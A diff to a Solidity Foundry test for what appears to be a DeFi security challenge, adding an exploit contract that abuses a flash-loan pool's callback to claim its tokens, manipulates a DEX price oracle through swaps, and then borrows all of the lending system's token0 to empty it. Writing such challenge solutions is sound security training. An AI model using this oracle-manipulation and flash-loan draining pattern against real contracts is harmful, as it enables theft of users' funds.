@@ -69,7 +69,8 @@ contract Challenge3Test is Test {
         //////////////////////////////*/
 
         //============================//
-
+        Exploit attacker = new Exploit(address(token0), address(token1), address(oracleDex), address(target), address(flashLoanPool));
+        attacker.pwn();
         vm.stopPrank();
 
         assertEq(token0.balanceOf(address(target)), 0, "You should empty the target contract");
@@ -82,8 +83,62 @@ contract Challenge3Test is Test {
 ////////////////////////////////////////////////////////////*/
 
 contract Exploit {
+    /// @dev Token contract address to be used for lending.
+    //IERC20 immutable public token;
+    IERC20 public token;
+    /// @dev Internal balances of the pool for each user.
+    mapping(address => uint) public balances;
+
+    // flag to notice contract is on a flashloan
+    bool private _flashLoan;
+
     IERC20 token0;
     IERC20 token1;
     BorrowSystemInsecureOracle borrowSystem;
     InsecureDexLP dex;
+    InSecureumLenderPool flashLoan;
+
+    constructor(address _token0, address _token1, address _dex, address _borrowSystem, address _flashLoanPool){
+        token0 = IERC20(_token0);
+        token1 = IERC20(_token1);
+        dex = InsecureDexLP(_dex);
+        borrowSystem = BorrowSystemInsecureOracle(_borrowSystem);
+        flashLoan = InSecureumLenderPool(_flashLoanPool);
+        token0.approve(address(dex),type(uint256).max);
+        token1.approve(address(dex),type(uint256).max);
+        token0.approve(address(borrowSystem),type(uint256).max);
+        token1.approve(address(borrowSystem),type(uint256).max);
+        token0.approve(address(flashLoan),type(uint256).max);
+        token1.approve(address(flashLoan),type(uint256).max);
+    }
+
+    function pwn() external {
+        //get token0 of FlashLoanPool
+        uint256 amount = token0.balanceOf(address(flashLoan));
+        flashLoan.flashLoan(
+          address(this),
+          abi.encodeWithSignature(
+            "receiveFlashLoan(uint256,address)", amount,address(this)
+          )
+        );
+        flashLoan.withdraw(amount);
+
+        //manipulate price of token 1
+        dex.swap(address(token0),address(token1),99 ether);
+        console.log("token 1 price before : ", borrowSystem.tokenPrice(token1.balanceOf(address(this))));
+        token0.transfer(address(dex), token0.balanceOf(address(this)));
+        dex.swap(address(token1),address(token0),1 ether);
+        console.log("token 1 price after : ", borrowSystem.tokenPrice(token1.balanceOf(address(this))));
+
+        //get all token0 from borrowSystem
+        borrowSystem.depositToken1(token1.balanceOf(address(this))); 
+        borrowSystem.borrowToken0(token0.balanceOf(address(borrowSystem)));
+        token0.transfer(address(flashLoan),1000 ether);
+
+        //The solution is not optimized
+    }
+    function receiveFlashLoan(uint256 amount, address attacker) public {
+        balances[attacker] = amount;
+        
+    }
 }
